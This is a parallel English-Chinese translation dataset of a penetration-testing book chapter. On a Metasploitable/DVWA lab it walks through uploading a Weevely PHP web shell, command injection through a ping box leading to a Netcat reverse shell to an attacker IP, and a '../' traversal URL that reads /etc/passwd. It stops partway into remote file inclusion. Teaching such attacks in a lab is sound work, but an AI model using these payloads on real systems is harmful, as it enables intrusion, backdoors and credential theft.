- en: File Upload, Code Execution, and File Inclusion Vulnerabilities
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 文件上传、代码执行和文件包含漏洞
- en: This chapter will talk about different vulnerabilities and will explain how
    to perform them on the Metasploitable machine. A detailed illustration of the
    each of the scenarios will be covered. At the end of every section, we will also
    see a quick solution to each vulnerability explained.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将讨论不同的漏洞，并解释如何在Metasploitable机器上进行攻击。每个场景的详细说明将在本章涵盖。在每个部分的末尾，我们还将看到针对每个漏洞的快速解决方案。
- en: 'The chapter will cover the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 本章将涵盖以下主题：
- en: File upload vulnerabilities
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 文件上传漏洞
- en: Code execution vulnerabilities
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 代码执行漏洞
- en: Local file inclusion vulnerabilities
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 本地文件包含漏洞
- en: Basic mitigation
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 基本的缓解措施
- en: File upload vulnerabilities
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 文件上传漏洞
- en: In this chapter, we're going to have a look at file upload vulnerabilities.
    This is the simplest type of vulnerability because it allows us to upload any
    type of file. For example, if the target computer can understand PHP, then we
    can upload any PHP file or a PHP shell and get full control over the target computer.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将了解文件上传漏洞。这是最简单的漏洞类型，因为它允许我们上传任何类型的文件。例如，如果目标计算机能够理解PHP，我们可以上传任何PHP文件或PHP
    Shell，从而完全控制目标计算机。
- en: If the target computer or the target server understands Python then we can just
    upload Python code or Python Shell. We can create these shells using Veil-Evasion
    or Metasploit, or we can use our own PHP or Python Shell.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 如果目标计算机或目标服务器支持Python，我们可以直接上传Python代码或Python Shell。我们可以使用Veil-Evasion或Metasploit来创建这些Shell，或者我们可以使用自己的PHP或Python
    Shell。
- en: In the next section, we are going to have a look at a tool called Weevely that
    generates PHP shells and allows us to gain access to and do a number of cool things
    on the target computer.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 在接下来的部分，我们将了解一个名为Weevely的工具，它可以生成PHP Shell，并允许我们获得访问权限，在目标计算机上执行一些很酷的操作。
- en: Getting started with Weevely
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 开始使用Weevely
- en: When we're trying to pen test a website, before trying to use any tools or any
    other means, after we perform our information gathering, first browse the website.
    Just get a feel of the website, see what's installed on it, and try to exploit
    the features.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们尝试进行网站渗透测试时，在使用任何工具或其他方法之前，先进行信息收集后浏览网站。先对网站有一个基本的了解，看看网站上安装了什么，并尝试利用其功能。
- en: 'After going through the website, upload a file using the Upload tab. The website
    allows us to upload a file. Sometimes in penetration testing tasks, it could be
    a website that''s allowing us to upload a profile picture or a classified website
    allowing us to upload pictures of cars:'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在浏览完该网站后，使用上传标签上传文件。该网站允许我们上传文件。有时在渗透测试任务中，可能会遇到一个允许我们上传个人头像的网页，或者一个允许我们上传汽车图片的机密网站：
- en: '![](assets/01655443-90ed-44ab-91c7-b4a03732e422.png)'
  id: totrans-14
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/01655443-90ed-44ab-91c7-b4a03732e422.png)'
- en: As we can see in the preceding screenshot, the website expects us to choose
    and upload an image. Choose any image by clicking the Browse... button, and upload
    a picture by clicking the Upload button.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 如前面的截图所示，网站要求我们选择并上传一张图片。点击“浏览...”按钮选择任何图片，然后点击“上传”按钮上传图片。
- en: 'We can now see, in the following screenshot, that the image has been uploaded
    successfully:'
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在可以看到，在下面的截图中，图片已成功上传：
- en: '![](assets/ee6ab740-18ce-4128-9528-1b08d6218926.png)'
  id: totrans-17
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/ee6ab740-18ce-4128-9528-1b08d6218926.png)'
- en: It's placed in `../../hackable/uploads/image.jpeg`, which means two directories
    backward followed by the filename.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 它被放置在`../../hackable/uploads/image.jpeg`，这意味着回退两个目录，接着是文件名。
- en: 'Let''s see whether the picture has actually been uploaded. We''re going to
    use two directories, the vulnerabilities (`10.0.2.4/dvwa`) and upload (`hackable/uploads/image.jpeg`).
    We are using the directories just to ensure that the picture was uploaded properly.
    Once we add the directories to the address bar, we will see that the picture has
    been successfully uploaded:'
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看看图片是否真的上传了。我们将使用两个目录，漏洞目录（`10.0.2.4/dvwa`）和上传目录（`hackable/uploads/image.jpeg`）。我们使用这些目录只是为了确保图片被正确上传。一旦我们将目录添加到地址栏中，就可以看到图片已经成功上传：
- en: '![](assets/8475789f-16a3-4900-8e28-084c51c24eae.png)'
  id: totrans-20
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/8475789f-16a3-4900-8e28-084c51c24eae.png)'
- en: The next thing we want to do is try uploading a PHP file, and to do that we're
    going to use a tool called Weevely. As said before, to create a payload or a shell,
    if that's what we want to call it (and it obviously is going to be a PHP shell),
    we can use Metasploit. To create a PHP payload, we're going to use a different
    tool that's designed for web application penetration testing.
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来我们要做的事情是尝试上传一个PHP文件，为此我们将使用一个名为Weevely的工具。正如之前所说，要创建一个有效载荷或shell，如果我们要这么称呼它（显然它将是一个PHP
    shell），我们可以使用Metasploit。为了创建一个PHP有效载荷，我们将使用一个专门用于Web应用渗透测试的工具。
- en: 'It''s quite easy to use. First, we are going to type the tool name `weevely`
    and add `generate` because we want to generate a payload or a shell file. Then
    we will put a password for the file so that only we can access it and control
    the website. As demonstrated in the following snippet, the password is `123456`
    and we want to store it in the `/root` location, called `shell.php`. The command
    is as follows:'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: 它非常容易使用。首先，我们输入工具名称`weevely`并添加`generate`，因为我们想要生成一个有效载荷或shell文件。然后我们为文件设置一个密码，这样只有我们能访问并控制该网站。正如下面的代码段所示，密码是`123456`，并且我们希望将其存储在`/root`位置，命名为`shell.php`。命令如下：
- en: '[PRE0]'
  id: totrans-23
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: So, `weevely` is the name of the program, `generate` is to generate a shell,
    followed by the password, for authentication purposes, which is stored in `/root/shell.php`.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 所以，`weevely`是程序的名称，`generate`是用来生成shell的命令，后面跟着密码，用于身份验证，并存储在`/root/shell.php`位置。
- en: 'Hit *Enter* and create it. As we can see in the following screenshot, the file
    is generated at the specified location:'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 按下*Enter*键并创建它。如下面的截图所示，文件已在指定位置生成：
- en: '![](assets/eb903568-be93-4307-a2de-ae1ae01b7097.png)'
  id: totrans-26
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/eb903568-be93-4307-a2de-ae1ae01b7097.png)'
- en: 'Now go back to the DVWA website and upload the `shell.php` file the same way
    we uploaded the image. All we need to do is use run the following command:'
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 现在回到DVWA网站，按照上传图片的方式上传`shell.php`文件。我们只需运行以下命令：
- en: '[PRE1]'
  id: totrans-28
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'This process is similar to multi-handler waiting for a connection to the backdoor.
    We are connecting the backdoor that we uploaded, and we can see in the following
    screenshot we are in the filesystem:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 这个过程类似于多重处理器等待与后门的连接。我们正在连接我们上传的后门，我们可以在下面的截图中看到我们已经进入了文件系统：
- en: '![](assets/577b3b45-56fd-4945-8b24-77956d4f9f2c.png)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/577b3b45-56fd-4945-8b24-77956d4f9f2c.png)'
- en: 'Using `weevely`, we''ll can just type in any Linux command, which will be executed
    on the target computer, and for which we can see the results. If we type `pwd`
    we will be able to see the location `/var/www/dvwa/hackable/uploads`, and if we
    type `id`, we will be able to see the user, which is the `www-data`. If we type
    `uname -a`, just to confirm that this is the Metasploitable machine, it will give
    us the following output:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`weevely`，我们可以输入任何Linux命令，这些命令将在目标计算机上执行，并且我们可以看到结果。如果我们输入`pwd`，我们将看到`/var/www/dvwa/hackable/uploads`位置，如果输入`id`，我们将看到用户是`www-data`。如果我们输入`uname
    -a`，为了确认这是Metasploitable机器，它将给出如下输出：
- en: '![](assets/39338a0e-1566-402d-899a-2fac1232a2e9.png)'
  id: totrans-32
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/39338a0e-1566-402d-899a-2fac1232a2e9.png)'
- en: 'We can do anything we want: list the files, navigate; we can perform any Linux
    command that we want. Weevely also offers many more features. If we type in `help`,
    we''ll be able to see more functionalities of Weevely. We can try to escalate
    our privileges, execute SQL queries, and a lot of cool stuff that is just designed
    for web application penetration testing.'
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以做任何想做的事情：列出文件，进行导航；我们可以执行任何想要的Linux命令。Weevely还提供了更多功能。如果我们输入`help`，我们将能够看到Weevely的更多功能。我们可以尝试提升权限，执行SQL查询，还有许多专为Web应用渗透测试设计的酷炫功能。
- en: Code execution vulnerabilities
  id: totrans-34
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 代码执行漏洞
- en: This type of vulnerability allow us to execute the **operating system** (**OS**)
    code on the target server. If the target server uses Windows, we will be able
    to execute Windows commands. If it uses Linux, then we will be able to use Linux
    commands.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 这种类型的漏洞允许我们在目标服务器上执行**操作系统**（**OS**）代码。如果目标服务器使用Windows系统，我们将能够执行Windows命令。如果它使用Linux系统，我们则能够执行Linux命令。
- en: This is a critical vulnerability that would allow the attacker to do anything
    they want with the target's server. We can upload a PHP shell using the `wget`
    command, or upload a payload, a virus, using the `wget` Linux command. We just
    need to make sure that we're uploading it to a file or to a directory that we're
    allowed to write to.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 这是一个关键性漏洞，它允许攻击者对目标服务器做任何他们想做的事情。我们可以使用 `wget` 命令上传 PHP Shell，或者通过 `wget` Linux
    命令上传负载文件或病毒。我们只需要确保我们上传到一个允许写入的文件或目录中。
- en: Another way of exploiting this vulnerability is to just run OS commands and
    get a reverse shell based on these commands. We can run OS commands and the programming
    languages supported by the OS in order to try and get a reverse connection on
    our computer.
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 利用这个漏洞的另一种方式是直接运行操作系统命令，通过这些命令获取反向 Shell。我们可以运行操作系统命令，以及操作系统支持的编程语言，尝试在我们的计算机上获得反向连接。
- en: Let's assume that we are browsing and click on the Command Execution tab on
    DVWA, which take us to the textbox website, which will ping for free. We should
    always try to experiment with the input box we see, try to see what that input
    box does and what can we inject into it, and what can we do to get hacking started.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 假设我们正在浏览，点击 DVWA 中的命令执行选项卡，进入文本框网页，它会免费执行 ping。我们应该始终尝试实验我们看到的输入框，尝试查看该输入框的作用，能注入什么内容，以及我们可以做些什么来启动黑客攻击。
- en: 'So, for example, this input box is asking us to ping, and if we put in an IP,
    for example, we''re going to put `10.0.2.15`. After filling in the details, click
    on submit. We can see the ping results in the following screenshot:'
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 比如，这个输入框要求我们执行 ping 操作，如果我们输入一个 IP 地址，比如 `10.0.2.15`，然后点击提交。我们可以在下方截图中看到 ping
    的结果：
- en: '![](assets/d6d527bc-d13c-4ad2-a8ca-174d854e42ad.png)'
  id: totrans-40
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d6d527bc-d13c-4ad2-a8ca-174d854e42ad.png)'
- en: We can view the execution of the `ping` command in Linux systems. Now let's
    see if we can exploit, if it's actually executing the `ping` command.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在 Linux 系统中查看 `ping` 命令的执行情况。现在让我们看看是否能利用它，实际执行 `ping` 命令。
- en: How would we exploit it if it's accepting what we're inputting, and then it
    will `ping` the command?
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 如果它接受我们输入的内容，然后执行 `ping` 命令，我们该如何利用这个漏洞呢？
- en: In Linux and Unix-based commands, we can use the semicolon (`;`) sign to execute
    multiple commands on one line, for example, `10.20.14.203;`.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Linux 和基于 Unix 的系统中，我们可以使用分号（`;`）符号在一行上执行多个命令，例如 `10.20.14.203;`。
- en: If we try writing this command on the Terminal. Let's start by writing the list
    command, `ls`, and then `pwd`, which is the working directory. So if we write
    `ls;` followed by `pwd`, it will execute both commands. It will also display the
    working directory.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们尝试在终端中写入这个命令，首先输入列出命令 `ls`，然后输入 `pwd`，表示当前工作目录。所以，如果我们写 `ls;` 后跟 `pwd`，它会同时执行这两个命令，并显示工作目录。
- en: '![](assets/6411da96-1431-40e8-aa2b-e8c0c63e062c.png)'
  id: totrans-45
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/6411da96-1431-40e8-aa2b-e8c0c63e062c.png)'
- en: 'This time, we will be adding `pwd` next to the IP address. Here''s it how it
    should look:'
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 这次，我们将在 IP 地址旁添加 `pwd`。下面是它的样子：
- en: '[PRE2]'
  id: totrans-47
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Let''s now see what will the execution look like. Go back to the DVWA server
    and write `10.0.2.15; pwd` on the address bar and then click `submit`. This screenshot
    shows us the current location of our working directory (`var/www/dvwa/vulnerabilities/exec`):'
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们来看一下执行过程是什么样的。返回到 DVWA 服务器，在地址栏输入 `10.0.2.15; pwd`，然后点击 `submit`。这张截图展示了我们当前工作目录的位置（`var/www/dvwa/vulnerabilities/exec`）：
- en: '![](assets/d134b4bf-0891-4442-8464-3d622803dc7b.png)'
  id: totrans-49
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/d134b4bf-0891-4442-8464-3d622803dc7b.png)'
- en: It clearly notes the `pwd` that was inserted is executed, which means that we
    can insert any commands and it will surely be executed.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 它清楚地标明了输入的 `pwd` 被执行了，这意味着我们可以输入任何命令，它都会被执行。
- en: Download the `code-execution-reverse-shell-commands.txt` resources file with
    commands from the book's GitHub repository to get a reverse connection from the
    target computer. There are a number of commands that will give us a reverse connection.
    All of the commands depend on the programming language. We have commands in PHP,
    Ruby, PERL, and BASH.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 从本书的 GitHub 仓库下载 `code-execution-reverse-shell-commands.txt` 资源文件，其中包含通过命令从目标计算机获取反向连接的命令。这里有一些命令可以帮助我们建立反向连接，所有命令都取决于编程语言。我们有
    PHP、Ruby、PERL 和 BASH 的命令。
- en: BASH is the Linux shell command language, so all Unix OS will be able to execute
    BASH commands. The `bash` command should work on most Unix-based systems. Again,
    most users would use Python and Netcat. We will be using Netcat in this chapter.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: BASH是Linux shell命令语言，因此所有Unix操作系统都能够执行BASH命令。`bash`命令应该在大多数基于Unix的系统上都能够运行。再次强调，大多数用户会使用Python和Netcat。在本章中我们将使用Netcat。
- en: 'Before getting started, we''re going to listen for connections the way we did
    previously with Metasploit for multi-handling. We can use a multi-handler to listen
    to the connections. Netcat is just a tool that allows us to listen to and connect
    computers together. Use the following command:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 在开始之前，我们将像之前使用Metasploit进行多处理一样监听连接。我们可以使用多处理程序来监听连接。Netcat只是一个工具，允许我们监听和连接计算机。使用以下命令：
- en: '[PRE3]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The `8080` is the port, `nc` is the program, and `vv` is used for viewing verbose
    output. We can check the output and see whether anything goes wrong. The `-l -p`
    command on `8080` is used for listening. Hit *Enter*, and we will able to see
    the following message:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: '`8080`是端口，`nc`是程序，`vv`用于查看详细输出。我们可以检查输出并查看是否出现任何问题。`-l -p`命令在`8080`上用于监听。按下*Enter*，我们将能够看到以下消息：'
- en: '![](assets/31412be5-540e-477b-aa82-4fe91dfbfea3.png)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/31412be5-540e-477b-aa82-4fe91dfbfea3.png)'
- en: The next command is going to help us connect the web server back to our computer
    using Netcat. So, let's assume that the web server has Netcat, and we check how
    it works.
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 下一个命令将帮助我们使用Netcat将Web服务器连接回我们的计算机。因此，让我们假设Web服务器上有Netcat，并检查它的工作原理。
- en: 'Refer to the Netcat command from the `code-execution-reverse-shell-commands.txt`
    file, which had all the commands written in it. Here is the command:'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 参考`code-execution-reverse-shell-commands.txt`文件中的Netcat命令，其中写有所有命令。以下是命令：
- en: '[PRE4]'
  id: totrans-59
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: As shown, we will use `/bin/sh`, the current IP of the device, the attacker
    device, followed by the port. In our case, it will be `10.0.2.14 8080`.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 如图所示，我们将使用`/bin/sh`，设备的当前IP，攻击者设备，然后是端口。在我们的情况下，将是`10.0.2.14 8080`。
- en: 'Copy the command and paste it into the address bar of DVWA server so that the
    `pwd` command is executed. Previously, the command that was used was `10.0.2.15;
    pwd`. But now let''s try removing the `pwd` and then paste the code. Here is the
    command:'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 复制命令并将其粘贴到DVWA服务器的地址栏中，以便执行`pwd`命令。之前使用的命令是`10.0.2.15; pwd`。但现在让我们尝试删除`pwd`然后粘贴代码。以下是命令：
- en: '[PRE5]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'This first IP connects the web server back to the Kali machine and then to
    the attacker machine:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 这个IP首先将Web服务器连接回Kali机器，然后再连接到攻击者机器：
- en: '![](assets/b0c3cf36-3b0c-4060-be19-df5fe495a526.png)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/b0c3cf36-3b0c-4060-be19-df5fe495a526.png)'
- en: 'Go back to the Terminal, and we will be to see a connection call to `10.0.2.4`
    from `10.0.2.15`, and we will again be adding `pwd`, `ls`, and `id`. As shown
    in the screenshot, when we insert the `id` command, we will get `www- data` and
    we can then add `uname` just to confirm whether it''s Metasploitable. Here''s
    a screenshot depicting this information:'
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 返回终端，我们将看到从`10.0.2.15`到`10.0.2.4`的连接调用，并且我们将再次添加`pwd`，`ls`和`id`。如截图所示，当我们插入`id`命令时，我们将得到`www-data`，然后我们可以添加`uname`来确认是否是Metasploitable。以下是展示这些信息的截图：
- en: '![](assets/a1d594f0-b9a4-4bfa-acbf-c83d5d69278d.png)'
  id: totrans-66
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a1d594f0-b9a4-4bfa-acbf-c83d5d69278d.png)'
- en: We can run any commands on the target computer and have access to the target
    computer.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在目标计算机上运行任何命令并访问目标计算机。
- en: Local file inclusion vulnerabilities
  id: totrans-68
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 本地文件包含漏洞
- en: Local file exploits or vulnerabilities allow us to read any file that is within
    the same server as the vulnerability; even if the file exists outside the `/var/www`
    directory, we'll be able to read the information within it.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 本地文件漏洞或漏洞允许我们读取与漏洞相同服务器中的任何文件；即使文件存在于`/var/www`目录之外，我们也能够读取其中的信息。
- en: A vulnerability is critical because we can read any files, such as important
    files or password files. Also, if there are a number of websites on the same server
    and we managed to find a website that we're not targeting, then we might be able
    to access files related to the website that we're targeting and then further exploit
    the website from there.
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: 漏洞是关键的，因为我们可以读取任何文件，比如重要文件或密码文件。此外，如果同一服务器上有许多网站，我们设法找到一个我们不针对的网站，那么我们可能能够访问与我们针对的网站相关的文件，然后进一步从那里利用该网站。
- en: We are going to exploit the vulnerability through the URL. So, usually in our
    code execution examples, we write the code in the textbox. Sometimes, we might
    find the code vulnerability in the URL, which will have keywords such as `cmd`.
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将通过 URL 利用此漏洞。因此，通常在我们的代码执行示例中，我们会在文本框中编写代码。有时，我们可能会在 URL 中发现代码漏洞，通常会包含 `cmd`
    这样的关键字。
- en: The same old process continues. Click on the File Inclusion tab on the DWVA
    server and the URL we get is `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php`.
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: 之前的流程继续。点击 DWVA 服务器上的文件包含选项卡，得到的 URL 为 `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=include.php`。
- en: 'We can see that the file already has a page. The `include.php` command will
    again load another page. As in the previous example, we will again see the URL
    with the IP address and the same `ping` command, as explained in the previous
    section. Here, in our example, the objective is to open a file using `include.php`.
    After removing the `page` term from the URL, the URL now will be visible as `http://10.0.2.4/dvwa/vulnerabilities/fi/include.php`.
    There is a fatal error generated, as shown in the following screenshot:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以看到该文件已经有一个页面。`include.php` 命令将再次加载另一个页面。如同之前的示例，我们将再次看到带有 IP 地址的 URL 和相同的
    `ping` 命令，正如前一部分所解释的那样。在我们的示例中，目标是通过 `include.php` 打开文件。去掉 URL 中的 `page` 参数后，URL
    现在变为 `http://10.0.2.4/dvwa/vulnerabilities/fi/include.php`。此时会产生一个致命错误，如下图所示：
- en: '![](assets/cc6915b5-75c5-4615-a7be-faf0ad4eb527.png)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/cc6915b5-75c5-4615-a7be-faf0ad4eb527.png)'
- en: 'We can see a file named `include.php` on the page, which is in the same working
    directory. Let''s try and see whether we can read a file called `/etc/passwd`
    that is stored in the computer. It''s the file containing all the user passwords
    present on the current web server and all the users using the current OS. Let''s
    go to the Terminal and run some commands. For example, running `cat/etc/passwd`
    on Kali returns the following output:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 我们可以在页面上看到一个名为 `include.php` 的文件，它位于相同的工作目录中。让我们尝试查看能否读取存储在计算机上的 `/etc/passwd`
    文件。这个文件包含当前 Web 服务器上的所有用户密码以及所有使用当前操作系统的用户。让我们打开终端并运行一些命令。例如，在 Kali 上运行 `cat/etc/passwd`
    返回如下输出：
- en: '![](assets/aef8cfc7-f88f-4264-8d16-101907f5ecf1.png)'
  id: totrans-76
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/aef8cfc7-f88f-4264-8d16-101907f5ecf1.png)'
- en: We will see all the users that we have been on the current computer and their
    default paths on the current OS. We will now try to read the `passwd` file. To
    do this, go back to the current location in the `fi` directory, which was mentioned
    before. Referring to the previous screenshot, when in `/var/www/dvwa/vulnerabilities/fi/include.php`,
    we are in the `fi` directory; we need to go back five places back to get to `/etc/passwd`.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将看到当前计算机上的所有用户及其在当前操作系统上的默认路径。现在我们将尝试读取 `passwd` 文件。为此，请返回到之前提到的 `fi` 目录中的当前位置。参照之前的截图，当我们位于
    `/var/www/dvwa/vulnerabilities/fi/include.php` 时，我们就在 `fi` 目录下；我们需要返回五个位置，才能到达
    `/etc/passwd`。
- en: 'As explained, we will need to go five places back by adding double dots. So,
    the URL changes to `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd`.
    The output will be seen once we hit *Enter* is as follows:'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，我们需要通过添加双点符号返回五个位置。因此，URL 会变成 `http://10.0.2.4/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd`。按下
    *Enter* 键后，输出将如下所示：
- en: '![](assets/a7a7b044-3b8c-4fa1-bacb-a903a6bd82b5.png)'
  id: totrans-79
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a7a7b044-3b8c-4fa1-bacb-a903a6bd82b5.png)'
- en: We will be able to see the `/etc/passwd` files. To understand and read the data,
    copy the data on a notepad. By doing so, we will get more information about the
    targeted websites. We can also access different, sensitive files, or files of
    other websites on the same server. The next section will help us understand remote
    file inclusion using Metasploitable.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将能够看到 `/etc/passwd` 文件。为了理解并读取数据，可以将数据复制到记事本中。这样，我们将获得更多关于目标网站的信息。我们还可以访问同一服务器上不同的敏感文件，或者其他网站的文件。下一部分将帮助我们理解如何使用
    Metasploitable 进行远程文件包含。
- en: Remote file inclusion using Metasploitable
  id: totrans-81
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用 Metasploitable 进行远程文件包含
- en: Remote file inclusion is a special way of exploiting file inclusion vulnerabilities.
    In the previous section, we learned how to include a file in the server and the
    ways to access it through local file inclusion vulnerabilities.
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 远程文件包含是一种利用文件包含漏洞的特殊方式。在前一部分中，我们学习了如何将文件包含到服务器中，以及如何通过本地文件包含漏洞进行访问。
- en: In this section, we will learn how to configure a server so that it allows the
    `allow_url` and `allow_url_fopen` functions. This will allow the inclusion of
    a file from a computer to the target website. We will learn how to inject a PHP
    file into the target computer, which will help us to run payloads and reverse
    shells and system commands, allowing access to the target or full control of the
    target server.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将学习如何配置服务器以允许`allow_url`和`allow_url_fopen`函数。这将允许从计算机向目标网站包含文件。我们将学习如何将PHP文件注入到目标计算机中，这将帮助我们运行有效载荷和反向shell以及系统命令，从而允许访问目标或完全控制目标服务器。
- en: Let's get started by exploiting the file inclusion vulnerability that was discussed
    in the previous section. We will be using the same `page` parameter here. The
    only thing that is different here is the transition from local file inclusion
    to remote file inclusion. This will ensure that the local file inclusion will
    allow the accessing of local files, and remote file inclusion will allow the accessing
    and injection of remote files.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们从利用上一节讨论的文件包含漏洞开始。我们将在这里使用相同的`page`参数。这里唯一不同的是从本地文件包含转变为远程文件包含。这将确保本地文件包含允许访问本地文件，而远程文件包含将允许访问和注入远程文件。
- en: 'Let''s test the vulnerability using the Metasploitable framework. In the framework,
    we will be using PHP settings, which are stored in the file. To access them, we
    will use `nano`, which is a text editor. We need to type the location of the configuration
    file, which is at `/``etc/php5/cgi/php.ini`, into the `nano` editor. `/etc/php5/cgi` is
    the actual location where our PHP configuration file is located. We need to add
    `sudo` as the root. In Kali, we do not need to add `sudo`, because we log in as
    `root`, but in Metaspolitable, we need to add `sudo` to carry out `root` actions.
    After adding `sudo` to the present command, run the following command:'
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们使用Metasploitable框架测试漏洞。在框架中，我们将使用存储在文件中的PHP设置。为了访问它们，我们将使用`nano`，这是一个文本编辑器。我们需要在`nano`编辑器中输入配置文件的位置，即`/etc/php5/cgi/php.ini`。`/etc/php5/cgi`是我们的PHP配置文件实际位置。我们需要将`sudo`添加为root。在Kali中，我们不需要添加`sudo`，因为我们以`root`身份登录，但在Metaspolitable中，我们需要添加`sudo`来执行`root`操作。在将`sudo`添加到当前命令后，运行以下命令：
- en: '[PRE6]'
  id: totrans-86
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'If we want to search for the `allow_url_fopen` function, press *Ctrl* + *W*
    and type `allow_url` and hit *Enter*. We will be able to see that `allow_url_fopen`
    and `allow_url_include` are `On`:'
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们想要搜索`allow_url_fopen`函数，按*Ctrl* + *W*，然后输入`allow_url`并按*Enter*。我们将看到`allow_url_fopen`和`allow_url_include`都是`On`：
- en: '![](assets/a0b21332-5f1b-4e60-b473-c4dbaff94c23.png)'
  id: totrans-88
  prefs: []
  type: TYPE_IMG
  zh: '![](assets/a0b21332-5f1b-4e60-b473-c4dbaff94c23.png)'
- en: If we enable these two functions, then the local file inclusion vulnerability
    can be used for remote file inclusion. To exit the current operation, use *Ctrl *+
    *X;* to save, use *Ctrl* + *Y* and *Enter.* After saving the file restart the
    web server, by entering `sudo /etc/init.d/apache2 restart`.
